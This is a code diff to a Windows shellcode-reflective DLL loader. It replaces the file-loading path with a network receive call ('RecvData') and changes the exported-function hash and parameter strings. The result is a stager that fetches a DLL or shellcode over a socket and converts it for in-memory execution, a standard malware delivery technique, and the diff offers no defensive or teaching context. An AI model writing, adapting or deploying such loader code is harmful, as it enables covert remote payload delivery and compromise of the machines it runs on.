@@ -4,7 +4,7 @@
 #include "stdafx.h"
 #include <windows.h>
 #include <string>
-
+#include"socket.h"
 #define DEREF_64( name )*(DWORD64 *)(name)
 #define DEREF_32( name )*(DWORD *)(name)
 #define DEREF_16( name )*(WORD *)(name)
@@ -375,7 +375,7 @@ int main(int argc, char *argv[], char *envp[])
 
 	// For any MessageBox testing in the blob
 	HMODULE test = LoadLibraryA("User32.dll"); 
-
+	/*
 	if (argc < 2) {
 		printf("\n[!] Usage:\n\n\tNativeLoader.exe <DLL File>\n\tNativeLoader.exe <Shellcode Bin>\n");
 		return 0;
@@ -384,11 +384,13 @@ int main(int argc, char *argv[], char *envp[])
 		printf("\n[!] Failed to load file\n");
 		return 0;
 	}
+	*/
+	dataSize = RecvData(&data);
 
 	if (data[0] == 'M' && data[1] == 'Z') {
 		printf("[+] File is a DLL, attempting to convert\n");
 
-		if (!ConvertToShellcode(data, dataSize, HashFunctionName("SayHello"), "dave", 5, SRDI_CLEARHEADER, finalShellcode, finalSize)) {
+		if (!ConvertToShellcode(data, dataSize, HashFunctionName("byabalckc4t"), "dalaoshi", 5, SRDI_CLEARHEADER, finalShellcode, finalSize)) {
 			printf("[!] Failed to convert DLL\n");
 			return 0;
 		}
